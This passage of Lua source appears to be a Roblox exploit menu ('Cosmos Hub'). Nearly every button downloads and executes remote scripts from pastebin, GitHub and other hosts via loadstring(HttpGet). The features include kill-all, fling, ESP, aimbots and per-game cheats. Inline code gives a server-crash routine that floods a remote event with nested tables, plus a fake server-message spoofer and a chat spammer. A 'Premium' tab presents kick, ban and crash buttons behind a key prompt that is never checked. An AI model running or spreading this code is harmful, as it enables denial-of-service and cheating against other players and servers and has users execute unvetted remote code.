    pcall(function() loadstring(game:GetObjects("rbxassetid://10572164822")[1].Source)() end)
end)
local AdminSection = Admin:NewSection("OP Scripts")
AdminSection:NewButton("God Mode", "Click to get tool", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/FwfNEqYz", true))() 
end)
AdminSection:NewButton("Invisible God Mode", "Click to get tool", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/HMcCQbpk", true))()
end)
AdminSection:NewButton("Studio Editor", "Click to get tool", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/scripts/main/DarkDexV3.lua"))();
end)
local Trolling = Window:NewTab("Trolling")
local TrollingSection = Trolling:NewSection("All Players")
TrollingSection:NewButton("Kill all", "You need a tool for this", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/DigitalityScripts/roblox-scripts/main/Kill%20All'))()
end)
TrollingSection:NewButton("Fling all", "Reset to stop", function()
    loadstring(game:HttpGet('https://github.com/DigitalityScripts/roblox-scripts/raw/main/loop%20fling%20all'))()
end)
TrollingSection:NewButton("Noclip Fling all", "You need a tool for this", function()
    Target = "name" -- target name, can be shortened
flinghh = 1000 -- what to set your hipheight to while flinging
loadstring(game:HttpGet("https://xn--9p9haaaaaa.tk/scripts/CarpetFling.lua"))()
end)
TrollingSection:NewButton("Bring all", "You need a tool for this", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/DigitalityScripts/roblox-scripts/main/Bring%20All'))()
end)
local TrollingSection = Trolling:NewSection("Weapons")
TrollingSection:NewButton("Pistol", "Click to get tool", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/SeRxrgci", true))()
end)
TrollingSection:NewButton("AK-47", "Click to get tool", function()
    game:GetObjects("rbxassetid://149948769")[1].Parent=game.Players.LocalPlayer.Backpack
end)
TrollingSection:NewButton("Telekinisis Gun", "Press C", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/fauftxLe", true))()
end)
TrollingSection:NewButton("Huge Sword", "Click to get tool", function()
    game:GetObjects("rbxassetid://169934427")[1].Parent=game.Players.LocalPlayer.Backpack
end)
TrollingSection:NewButton("6 Swords", "Click to get tool", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/80juE2kw", true))()
end)
TrollingSection:NewButton("Purple Swords", "Click to get tool", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/8YWDfKjF", true))()
end)
local TrollingSection = Trolling:NewSection("Chat")
TrollingSection:NewButton("Chat Spoofer", "Click to get tool", function()
    loadstring(game:HttpGet(('https://pastebin.com/raw/djBfk8Li'),true))()
end)
TrollingSection:NewButton("Server Message", "Send a fake server message", function()
    player =  "Server"
fakemsg = "Welcome Admin (c00lkidd) joined"
message = "Hi                                                                                                                                                            ["..tostring(player).."]: "..tostring(fakemsg)
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
end)
TrollingSection:NewButton("Insult Bypass", "Click to get tool", function()
    loadstring(game:HttpGet("https://the-shed.xyz/roblox/scripts/ChatBypass", true))()
end)
TrollingSection:NewButton("Chat Translator", "Click to get tool", function()
    loadstring(game:HttpGetAsync('https://i.qts.life/r/ChatInlineTranslator.lua', true))()
end)
TrollingSection:NewButton("Chat Remover", "Click to get tool", function()
    while true do
        wait(1.7)
    local args = {
        [1] = " ",
        [2] = "All"
    }
    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
    end
end)
TrollingSection:NewButton("Chat Spammer", "Click to get tool", function()
    while true do wait(0) 

        local A_1 = "JOIN COSMOS HUB TODAY - MADE BY COSMOS" local A_2 = "All" 
        local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) end
end)
local TrollingSection = Trolling:NewSection("Broken Stuff")
TrollingSection:NewButton("Mouse Fling", "Press E", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Pylwt/mouse-fling/main/README.md", true))() 
end)
TrollingSection:NewButton("Huge Dick", "Must be wearing 10 fedoras", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Pylwt/huge-pp1/main/README.md'))()
end)
TrollingSection:NewButton("Crash Server", "WARNING", function()
    --// made my reestart
--// fixed by daddy ewo
while wait(0.6) do --// don't change it's the best
game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
local function getmaxvalue(val)
local mainvalueifonetable = 499999
if type(val) ~= "number" then
return nil
end
local calculateperfectval = (mainvalueifonetable/(val+2))
return calculateperfectval
end
local function bomb(tableincrease, tries)
local maintable = {}
local spammedtable = {}
table.insert(spammedtable, {})
z = spammedtable[1]
for i = 1, tableincrease do
local tableins = {}
table.insert(z, tableins)
z = tableins
end
local calculatemax = getmaxvalue(tableincrease)
local maximum
if calculatemax then
maximum = calculatemax
else
maximum = 999999
end
for i = 1, maximum do
table.insert(maintable, spammedtable)
end
for i = 1, tries do
game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
end
end
bomb(250, 2) --// change values if client crashes
end 
end)
TrollingSection:NewButton("Void Spin", "Click to get tool", function()
power = 500 -- change this to make it more or less powerful
game:GetService('RunService').Stepped:connect(function()
game.Players.LocalPlayer.Character.Head.CanCollide = false
game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
end)
wait(.1)
local bambam = Instance.new("BodyThrust")
bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
bambam.Force = Vector3.new(power,0,power)
bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
end)
TrollingSection:NewButton("Freeze Time", "Press Left Ctrl", function()
    _G.key = Enum.KeyCode.LeftControl
    loadstring(game:HttpGet("https://paste.gg/p/anonymous/cb1c7198b269449eb8a2cf8ced061bed/files/4a98e88f82ee47388b3030a7f000b34e/raw", true))()
    setting = settings().Network
    local Effect = Instance.new("ColorCorrectionEffect")
    Effect.Parent = game.Lighting
    Effect.Saturation = -1 
    Effect.Contrast = 0
    toggle = false
    Effect.Enabled = false
    function onKeyPress(inputObject, gameProcessedEvent)
        if inputObject.KeyCode == Enum.KeyCode.RightControl then	
            if toggle == false then
                setting.IncomingReplicationLag = 1000
                Effect.Enabled = true
                toggle = true
            else
                setting.IncomingReplicationLag = 0
                Effect.Enabled = false
                toggle = false
            end
     
        end
    end
    game:GetService("UserInputService").InputBegan:connect(onKeyPress)
    game:GetService("UserInputService").InputBegan:connect(onKeyPress)
end)
TrollingSection:NewButton("OOF Spam", "Click to get tool", function()
    _G.enabled = true -- Re-execute to turn off
_G.speed = 110 -- Keep around 100 or it wont play
local RunService = game:GetService("RunService");
local Players = game:GetService("Players");
local LocalPlayer = game:GetService("Players").LocalPlayer;
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait();
local Humanoid = Character:WaitForChild("Humanoid") or Character:FindFirstChildOfClass("Humanoid");
local HRP = Humanoid.RootPart or Humanoid:FindFirstChild("HumanoidRootPart")
if not Humanoid or not _G.enabled then
   if Humanoid and Humanoid.Health <= 0 then
       Humanoid:Destroy()
   end
   return
end
Humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
Humanoid.BreakJointsOnDeath = false
Humanoid.RequiresNeck = false
local con; con = RunService.Stepped:Connect(function()
   if not Humanoid then return con:Disconnect() end
   Humanoid:ChangeState(Enum.HumanoidStateType.Running)  -- Change state so not die
end)
LocalPlayer.Character = nil
LocalPlayer.Character = Character
task.wait(Players.RespawnTime + 0.1)
while task.wait(1/_G.speed) do
   Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
end
end)
TrollingSection:NewButton("Clones", "Click to get tool", function()
    loadstring(game:GetObjects('rbxassetid://7339698872')[1].Source)() 
end)
TrollingSection:NewButton("Draw", "Click to get tool", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/1322re6a", true))()
end)
local TrollingSection = Trolling:NewSection("Avatar Forms")
TrollingSection:NewButton("AMOGUS", "Press Q,C,F", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Pylwt/amogus/main/README.md", true))()
end)
TrollingSection:NewButton("Swords God", "Q,E,T,F,L,Z,X,C,V,B,N,1,2,3,4,5,6,7,8,9,0", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/SwordSimIsGood/Sword-SG/main/Swords%20FE%20Starmd'))()
end)
TrollingSection:NewButton("Green Goku Form", "Click to get tool", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/UpHhv7Jg", true))()
end)
TrollingSection:NewButton("OP Titan Form", "Click to get tool", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/neCAa9AB", true))()
end)
TrollingSection:NewButton("Titan Form", "Click to get tool", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/ZmySaMrb", true))()
end)
TrollingSection:NewButton("Assasin Form", "Click to get tool", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/bKu2GuzN", true))()
end)
TrollingSection:NewButton("Beerus Form", "Click to get tool", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/c1TGDAKC", true))()
end)
TrollingSection:NewButton("Omega Form", "Click to get tool", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/VSerZV3e", true))()
end)
TrollingSection:NewButton("Galaxy Slasher", "You need to own Slasher first", function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/Toasty8i/slasher/main/slasher.lua'),true))()
end)
local Tools = Window:NewTab("All Tools")
local ToolsSection = Tools:NewSection("Here are all the tools we have")
local ToolsSection = Tools:NewSection("Some wont work on a few games")
ToolsSection:NewButton("Charms", "Click to get tool", function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/eH39iKSg")))
end)
ToolsSection:NewButton("Auto Clicker", "Click to get tool", function()
    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/JustEzpi/ROBLOX-Scripts/main/ROBLOX_AutoClicker"))()
end)
ToolsSection:NewButton("Ctrl Delete", "Click to get tool", function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/KGYKmYtW")))
end)
ToolsSection:NewButton("ESP", "Click to get tool", function()
    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/WRD ESP.txt"))()
end)
ToolsSection:NewButton("Fly V1", "Press C", function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/ReJ0TXqg")))
end)
ToolsSection:NewButton("Fly V2", "Press E", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/jebnPDXh", true))()
end)
ToolsSection:NewButton("FOV", "Click to get tool", function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/PRw16c2Y")))
end)
ToolsSection:NewButton("God Mode", "Click to get tool", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/FwfNEqYz", true))()
end)
ToolsSection:NewButton("Gravity", "Click to get tool", function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/0JgQ1hJy")))
end)
ToolsSection:NewButton("Infinite Jump", "Press V", function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
ToolsSection:NewButton("Invisible God Mode", "Click to get tool", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/HMcCQbpk", true))()
end)
ToolsSection:NewButton("Rejoin", "Click to get tool", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/1gtVMUz3"))()
end)
ToolsSection:NewButton("Save Game", "Click to get tool", function()
    saveinstance()
end)
ToolsSection:NewButton("Less Lag", "Click to get tool", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/eHEfAR8z", true))()
end)
ToolsSection:NewButton("No Clip", "Press B", function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/kt3Nxzw1")))
end)
ToolsSection:NewButton("Reset", "Click to get tool", function()
    game.Players.LocalPlayer:GetMouse().KeyUp:connect(function(key)
    if key == "r"  then
        game.Players.LocalPlayer.character:WaitForChild("Humanoid").Health = 0
    end  
end)
end)
ToolsSection:NewButton("Shift Run", "Click to get tool", function()
    repeat wait() until game.Players.LocalPlayer
m = game.Players.LocalPlayer:GetMouse()
m.KeyDown:connect(function(key)
 if key == "0" then --"Shift to run" 0 == shift
  print("Running")
  game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 70
 end
end)
m.KeyUp:connect(function(key)
 if key == "0" then
  game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
 end
end)
end)
ToolsSection:NewButton("TP tool", "Click to get tool", function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/njMw0Bke")))
end)
ToolsSection:NewButton("X-Ray", "Press X", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/vNpnSDCz", true))()
end)
ToolsSection:NewButton("Anti AFK", "Click to get tool", function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/dnwYtGCQ")))
end)
ToolsSection:NewButton("B-Tools V1", "Click to get tool", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/TrixAde/scripts/main/Btools.lua', true))()
end)
ToolsSection:NewButton("B-Tools V2", "Click to get tool", function()
    Instance.new("HopperBin", game.Players.LocalPlayer.Backpack).BinType = 2
Instance.new("HopperBin", game.Players.LocalPlayer.Backpack).BinType = 3
Instance.new("HopperBin", game.Players.LocalPlayer.Backpack).BinType = 4
end)
ToolsSection:NewButton("RTX", "Click to get tool", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/zxV27xHc", true))()
end)
ToolsSection:NewButton("Spectate", "Click to get tool", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/WgpJfMGS", true))()
end)
ToolsSection:NewButton("TP Gui", "Click to get tool", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/EBhdqeWb", true))()
end)
ToolsSection:NewButton("Reach Gui", "Click to get tool", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/tsbVWZdP", true))()
end)
ToolsSection:NewButton("Mute Boombox", "Click to get tool", function()
    while wait(1) do
        for i,v in pairs(game:GetDescendants()) do
        if v.Name == "BoomBox" then v:Destroy() end
        end
        end
end)
ToolsSection:NewButton("Draw", "Click to get tool", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/1322re6a", true))()
end)

local Games = Window:NewTab("Games")
local GamesSection = Games:NewSection("Join the game you want & click the buttons below")

GamesSection:NewButton("Prison Life", "You must be in the game for it to work", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/wMagw9Cn", true))()
end)

GamesSection:NewButton("Prison Life", "You must be in the game for it to work", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/wMagw9Cn", true))()
end)
GamesSection:NewButton("Gun Simulator", "You must be in the game for it to work", function()
    loadstring(game:HttpGet("https://paste.ee/r/KOoZW", true))()
end)
GamesSection:NewButton("Tower Of Hell", "You must be in the game for it to work", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/iiProductionz/Floater-Scripts/main/WaifuEdition/Tower%20Of%20Hell"))()
end)
GamesSection:NewButton("Legends Of Speed", "You must be in the game for it to work", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/Proxima-Hub/main/Main.lua"))()
end)
GamesSection:NewButton("Ninja Legends", "You must be in the game for it to work", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/Proxima-Hub/main/Main.lua"))()
end)
GamesSection:NewButton("Saber Simulator", "You must be in the game for it to work", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/Proxima-Hub/main/Main.lua"))()
end)
GamesSection:NewButton("BIG Paintball", "You must be in the game for it to work", function()
    pcall(loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/scripts/main/paintball.lua")))
loadstring(game:HttpGet('https://pastebin.com/raw/GVvyGhpx'))()
end)
GamesSection:NewButton("Adopt Me", "You must be in the game for it to work", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/1201for/V.G-Hub/main/V.Ghub"))()
end)
GamesSection:NewButton("Roblox Talent Show", "You must be in the game for it to work", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/liloskiller/Scripts/main/TalentShowObbyAutoFarm", true))()
end)
GamesSection:NewButton("Da Hood", "You must be in the game for it to work", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/TrixAde/scripts/main/DaHood-DoomWare.lua', true))()
end)
GamesSection:NewButton("AimBlox", "You must be in the game for it to work", function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/Straden/Scripts/main/stronccMain.lua'),true))()
end)
GamesSection:NewButton("Word Bomb", "You must be in the game for it to work", function()
    loadstring(game:HttpGet("https://gist.githubusercontent.com/DeveloperMikey/e38e678bc4c1a1ee92ff27db7cdd4c3f/raw/wordbomb.lua", true))()
end)
GamesSection:NewButton("Assasins", "You must be in the game for it to work", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/1201for/V.G-Hub/main/V.Ghub"))()
end)
GamesSection:NewButton("Bloxburg", "You must be in the game for it to work", function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/Wcd0ajFS")))
end)
GamesSection:NewButton("Bubble Gum", "You must be in the game for it to work", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/scripts/main/BubbleGumQoucxHub.lua"))()
end)
GamesSection:NewButton("Bed Wars", "You must be in the game for it to work", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
end)
GamesSection:NewButton("Doomspire", "You must be in the game for it to work", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/2dgeneralspam1/scripts-and-stuff/master/scripts/garfield%20hub", true))()
end)
GamesSection:NewButton("Islands", "You must be in the game for it to work", function()
    loadstring(game:HttpGet("http://void-scripts.com/Scripts/islands_new.lua"))()
end)
GamesSection:NewButton("KAT", "You must be in the game for it to work", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/78kG7trR", true))()
end)
GamesSection:NewButton("Murder Mystery 2", "You must be in the game for it to work", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/34KnyYvi", true))()
end)
GamesSection:NewButton("Mad City", "You must be in the game for it to work", function()
    pcall(loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/scripts/main/mad.lua")))
end)
GamesSection:NewButton("Pet Sim X", "You must be in the game for it to work", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/BdvUGb2q"))()
end)
GamesSection:NewButton("Work At A Pizza Place", "You must be in the game for it to work", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/scripts/main/work-a-pizza-place.lua",true))()
end)
GamesSection:NewButton("RagDoll Engine", "You must be in the game for it to work", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Scripts/master/Vynixius%20Ragdoll%20Engine"))()
end)
GamesSection:NewButton("SCP 3008", "You must be in the game for it to work", function()
    loadstring(game:HttpGet'https://raw.githubusercontent.com/RunDTM/scripts/main/3008.lua')()
end)
GamesSection:NewButton("Mega Easy Obby", "You must be in the game for it to work", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/X361rzKq"))()
end)
GamesSection:NewButton("Blox Fruits", "You must be in the game for it to work", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Cve-Hub/LnHub/main/README.md'))()
end)
GamesSection:NewButton("Funky Friday", "You must be in the game for it to work", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ZoinkyPoinkie/FunkyFridayDevTools/main/Un-Obfuscated",true))()
end)
GamesSection:NewButton("Slap Battles", "You must be in the game for it to work", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/dizyhvh/slap_battles_gui/main/0.lua"))()
end)
GamesSection:NewButton("Youtube Life", "You must be in the game for it to work", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Scripts/main/YouTube%20Life/Auto%20Farm.lua"))()
end)
GamesSection:NewButton("Build A Boat", "You must be in the game for it to work", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Vynixius/main/Build%20A%20Boat%20For%20Treasure/Script.lua"))()
end)
GamesSection:NewButton("Strucid", "You must be in the game for it to work", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AstroPublic/Astro.Public/main/astro.loader", true))()
end)
GamesSection:NewButton("Heights Sword Fight", "You must be in the game for it to work", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/tsbVWZdP", true))()
end)
local GamesSection = Games:NewSection("None of the scripts above are mine!")
local Hubs = Window:NewTab("Hubs")
local HubsSection = Hubs:NewSection("These Are Hubs From Other People!")
HubsSection:NewButton("Top3k Hub", "Click to open hub, Credits to owner", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Pylwt/Top3k/main/hub", true))()
end)
HubsSection:NewButton("Alpha X Hub", "Click to open hub, Credits to owner", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/bUmX44UN", true))()
end)
HubsSection:NewButton("Bolts Hub", "Click to open hub, Credits to owner", function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/fusiongreg/BoltsHubV5/main/BoltsHubV5'), true))()
end)
HubsSection:NewButton("Bruh Hub", "Click to open hub, Credits to owner", function()
    loadstring(game:HttpGet("https://bruh.keshsenpai.com/.lua"))()
end)
HubsSection:NewButton("Dark Hub", "Click to open hub, Credits to owner", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/Init", true))()
end)
HubsSection:NewButton("Eclipse Hub", "Click to open hub, Credits to owner", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/34KnyYvi", true))()
end)
HubsSection:NewButton("Extreme Hub", "Click to open hub, Credits to owner", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ExtremeAntonis/KeySystemUI/main/KeySystemUI-Obfuscated.lua"))()
end)
HubsSection:NewButton("EZ Hub", "Click to open hub, Credits to owner", function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/debug420/Ez-Industries-Launcher-Data/master/Launcher.lua'),true))()
end)
HubsSection:NewButton("Sorky Hub", "Click to open hub, Credits to owner", function()
    loadstring(game:HttpGet(('https://pastebin.com/raw/MHx8q6xP'),true))()
end)
HubsSection:NewButton("Owl Hub", "Click to open hub, Credits to owner", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))();
end)
HubsSection:NewButton("VG Hub", "Click to open hub, Credits to owner", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/1201for/V.G-Hub/main/V.Ghub"))()
end)
local HubsSection = Hubs:NewSection("Other Cosmos Hub Themes")
HubsSection:NewButton("RGB Theme", "Might be outdated!", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Pylwt/RGB-Pylwt/main/README.md", true))()

end)
HubsSection:NewButton("Light Theme", "Might be outdated!", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Pylwt/light/main/theme", true))()
end)
HubsSection:NewButton("Grape Theme", "Might be outdated!", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Pylwt/grape/main/theme", true))()
end)
HubsSection:NewButton("Blood Theme", "Might be outdated!", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Pylwt/blood/main/theme", true))()
end)
HubsSection:NewButton("Ocean Theme", "Might be outdated!", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Pylwt/ocean/main/theme", true))()
end)
HubsSection:NewButton("Midnight Theme", "Might be outdated!", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Pylwt/midnight/main/theme", true))()
end)
HubsSection:NewButton("Sentinel Theme", "Might be outdated!", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Pylwt/sentinel/main/theme", true))()
end)
HubsSection:NewButton("Synapse Theme", "Might be outdated!", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Pylwt/synapse/main/theme", true))()
end)
local Events = Window:NewTab("Events")
local EventsSection = Events:NewSection("These Are Scripts For Roblox Events")
local EventsSection = Events:NewSection("They can get you Badges and Avatar Items")
EventsSection:NewButton("Island of Move", "Click to enable", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/scripts/main/EventScripts.lua", true))()
end)
EventsSection:NewButton("Roblox Community Space", "Click to enable", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/scripts/main/EventScripts.lua", true))()
end)
EventsSection:NewButton("Bump World: Free Jungle", "Click to enable", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/scripts/main/EventScripts.lua", true))()
end)
EventsSection:NewButton("Mansion of Wonder", "Click to enable", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/scripts/main/EventScripts.lua", true))()
end)
EventsSection:NewButton("Roblox Creator Challenge", "Click to enable", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/scripts/main/EventScripts.lua", true))()
end)
EventsSection:NewButton("Roblox Creator Challenge Space", "Click to enable", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/scripts/main/EventScripts.lua", true))()
end)
EventsSection:NewButton("Roblox Creator Challenge Library", "Click to enable", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/scripts/main/EventScripts.lua", true))()
end)
EventsSection:NewButton("Roblox Creator Quiz", "Click to enable", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/scripts/main/EventScripts.lua", true))()
end)
EventsSection:NewButton("Luobu Mystery Box Hunt", "Click to enable", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/scripts/main/EventScripts.lua", true))()
end)
EventsSection:NewButton("Bakugan Launch Party", "Click to enable", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/scripts/main/EventScripts.lua", true))()
end)
EventsSection:NewButton("Beat the Scammers", "Click to enable", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/scripts/main/EventScripts.lua", true))()
end)
EventsSection:NewButton("Seventh Uncle, Ye Zehao Launch Party", "Click to enable", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/scripts/main/EventScripts.lua", true))()
end)
local Premium = Window:NewTab("Premium")
local PremiumSection = Premium:NewSection("Buy Cosmos Premium In Our Discord Server")
PremiumSection:NewTextBox("Enter Premium Key", "Enter Premium Key", function(txt)
	print(txt)
end)
local PremiumSection = Premium:NewSection("The Buttons Will Only Work When You Enter A Key")
PremiumSection:NewButton("Mute Player", "Enter A Correct Key First", function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
PremiumSection:NewButton("Fling Player", "Enter A Correct Key First", function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
PremiumSection:NewButton("Loop Fling Player", "Enter A Correct Key First", function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
PremiumSection:NewButton("Freeze Player", "Enter A Correct Key First", function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
PremiumSection:NewButton("Explode Player", "Enter A Correct Key First", function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
PremiumSection:NewButton("Kill Player", "Enter A Correct Key First", function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
PremiumSection:NewButton("Kill Aura", "Enter A Correct Key First", function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
PremiumSection:NewButton("Kick Player", "Enter A Correct Key First", function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
PremiumSection:NewButton("Ban Player", "Enter A Correct Key First", function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
PremiumSection:NewButton("Mute All", "Enter A Correct Key First", function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
PremiumSection:NewButton("Freeze All", "Enter A Correct Key First", function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
PremiumSection:NewButton("Explode All", "Enter A Correct Key First", function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
PremiumSection:NewButton("Kill All", "Enter A Correct Key First", function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
PremiumSection:NewButton("Kick All (Laggy)", "Enter A Correct Key First", function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
PremiumSection:NewButton("Ban All (Laggy)", "Enter A Correct Key First", function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
PremiumSection:NewButton("Lag Server", "Enter A Correct Key First", function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
PremiumSection:NewButton("Freeze Server", "Enter A Correct Key First", function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
PremiumSection:NewButton("Close Server", "Enter A Correct Key First", function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
PremiumSection:NewButton("Crash Server", "Enter A Correct Key First", function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
PremiumSection:NewButton("Flip Map", "Enter A Correct Key First", function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
PremiumSection:NewButton("Destroy Map (Laggy)", "Enter A Correct Key First", function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
